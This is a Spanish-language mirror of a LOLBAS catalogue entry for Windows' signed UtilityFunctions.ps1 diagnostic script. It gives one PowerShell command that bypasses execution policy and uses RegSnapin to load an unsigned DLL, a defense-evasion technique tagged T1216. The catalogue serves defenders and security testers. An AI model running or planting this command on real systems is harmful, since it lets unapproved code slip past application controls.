# LOLBAS: UtilityFunctions.ps1

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

PowerShell Diagnostic Script

## Comandos

### Execute proxied payload with Microsoft signed binary

Execute · priv: User · T1216

```cmd
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
```

Proxy execute Managed DLL with PowerShell

